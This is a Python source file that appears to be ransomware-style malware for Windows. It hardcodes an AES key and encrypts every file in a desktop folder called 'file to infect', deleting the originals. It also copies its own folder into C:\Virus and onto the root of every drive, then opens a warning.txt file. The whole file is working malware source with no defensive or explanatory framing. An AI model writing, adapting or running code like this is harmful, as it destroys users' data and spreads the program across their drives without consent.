import os, sys
import win32api
import winshell
from Crypto import Random
from Crypto.Cipher import AES

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(enc)


key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'

desktop = winshell.desktop()

dir = os.getcwd()
l = '\\';

if not os.path.exists('C:\Virus'):
	os.mkdir('C:\Virus')

for file in os.listdir(dir):
	src = dir+l+file
	dest = "C:\Virus"
	if not os.path.exists('C:\Virus'+l+file):
		os.system("xcopy %s %s" % (src, dest))

path = desktop+l+"file to infect"

for files in os.listdir(path):
	encrypt_file(path+l+files, key)
	os.remove(path+l+files)


drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
'''
for drive in drives:
	if not os.path.exists(drive+"Virus"):
		os.mkdir(drive+"Virus")
	for file in os.listdir(paths):
		src = paths+l+file
		dest = drive+"Virus"
		os.system("xcopy %s %s" % (src, dest))
'''	
for drive in drives:
	for file in os.listdir(dir):
		src = dir+l+file
		dest = drive
		if not os.path.exists(drive+l+file):
			os.system("xcopy %s %s" % (src, dest))
	
os.system('start warning.txt')



